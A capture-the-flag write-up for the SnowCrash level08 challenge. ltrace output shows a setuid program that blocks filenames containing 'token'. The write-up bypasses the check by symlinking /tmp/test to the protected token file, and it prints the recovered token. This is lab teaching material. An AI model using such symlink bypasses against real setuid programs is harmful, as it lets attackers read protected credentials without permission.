# Start / Search

```sh
dr-xr-x---+ 1 level08 level08  140 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level08 level08  220 Apr  3  2012 .bash_logout*
-r-x------  1 level08 level08 3518 Aug 30  2015 .bashrc*
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08*
-r-x------  1 level08 level08  675 Apr  3  2012 .profile*
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
```
>> We have prog with an effective user : flag08 ans a token file taht we can't write

```sh
level08@SnowCrash:~$ ltrace ./level08 token 
__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                            = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                        = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```
>> if filename pass in argument contain "token" it's exit

```sh
level08@SnowCrash:~$ vim /tmp/superTest
level08@SnowCrash:~$ ltrace ./level08 /tmp/superTest
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("/tmp/superTest", "token")                                   = NULL
open("/tmp/superTest", 0, 014435162522)                             = 3
read(3, "SuperTest\n", 1024)                                        = 10
write(1, "SuperTest\n", 10SuperTest
)                                         = 10
+++ exited (status 10) +++
```
>> if not token in the filename it read and write the file

>>(see also the main.log file)

## Exploit

So we will write the token file with level08 by changing his name with a sybolic link

```sh
level08@SnowCrash:/tmp$ ln -s ~/token ./test
level08@SnowCrash:~$ ./level08 /tmp/test
quif5eloekouj29ke0vouxean
```